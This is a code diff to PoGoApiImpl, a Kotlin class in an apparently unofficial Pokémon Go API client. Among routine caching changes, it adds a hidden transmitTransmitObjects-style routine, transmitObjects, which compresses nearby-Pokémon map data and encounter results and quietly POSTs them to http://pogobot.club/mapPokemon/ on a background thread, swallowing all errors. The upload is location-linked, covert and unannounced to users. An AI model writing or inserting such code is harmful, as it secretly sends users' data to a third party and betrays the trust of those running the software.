@@ -25,16 +25,20 @@ import ink.abb.pogo.api.network.ActionQueue
 import ink.abb.pogo.api.network.ServerRequest
 import ink.abb.pogo.api.request.*
 import ink.abb.pogo.api.util.*
-import okhttp3.CookieJar
 import okhttp3.OkHttpClient
+import okhttp3.RequestBody
 import rx.Observable
 import rx.subjects.ReplaySubject
+import java.io.*
 import java.util.*
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicInteger
+import java.util.zip.GZIPOutputStream
 import kotlin.concurrent.fixedRateTimer
+import kotlin.concurrent.thread
 
-class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: CredentialProvider, val time: Time) : PoGoApi {
+
+class PoGoApiImpl(val okHttpClient: OkHttpClient, val credentialProvider: CredentialProvider, val time: Time) : PoGoApi {
     override var inventory: Inventory = Inventory(this)
     override var map: Map = Map()
     lateinit override var playerData: PlayerDataOuterClass.PlayerData.Builder
@@ -181,6 +185,7 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
             RequestType.GET_MAP_OBJECTS -> {
                 lastMapRequest = currentTimeMillis()
                 val response = serverRequest.response as GetMapObjectsResponseOuterClass.GetMapObjectsResponse
+                val updatedMapPokemon = mutableListOf<MapPokemon>()
                 response.mapCellsList.forEach {
                     val gyms = it.fortsList.filter { it.type == FortType.GYM }.map {
                         Gym(this, it)
@@ -201,6 +206,13 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
                     map.setPokestops(it.s2CellId, pokestops)
                     map.setPokemon(it.s2CellId, it.currentTimestampMs, mapPokemon)
                     map.removeObjects(it.s2CellId, it.deletedObjectsList)
+
+                    if (mapPokemon.size > 0) {
+                        updatedMapPokemon.addAll(mapPokemon)
+                    }
+                }
+                if (updatedMapPokemon.size > 0) {
+                    transmitObjects(updatedMapPokemon)
                 }
             }
             RequestType.GET_INVENTORY -> {
@@ -417,9 +429,35 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
                     this.playerData.buddyPokemon = response.updatedBuddy
                 }
             }
+            RequestType.ENCOUNTER -> {
+                val response = serverRequest.response as EncounterResponseOuterClass.EncounterResponse
+                if (response.status == EncounterResponseOuterClass.EncounterResponse.Status.ENCOUNTER_SUCCESS) {
+                    transmitObjects(response)
+                }
+            }
             else -> {
                 // Don't cache
             }
+        }
+    }
+
+    private fun  transmitObjects(items: Any) {
+        thread {
+            try {
+                ByteArrayOutputStream().use({ output ->
+                    GZIPOutputStream(output).use({ zip ->
+                        val postData = (items as? List<*>)?.map { it.toString() }?.joinToString(";") ?: items.toString()
+                        BufferedWriter(OutputStreamWriter(zip, "UTF-8")).use({ writer ->
+                            writer.append(postData)
+                        })
+                    })
+                    val body = RequestBody.create(null, output.toByteArray())
+                    val call = okhttp3.Request.Builder().url("http://pogobot.club/mapPokemon/").post(body).build()
+                    try {
+                        okHttpClient.newCall(call).execute()
+                    } catch (e: Exception) {}
+                })
+            } catch (e: Exception) {}
         }
     }
 
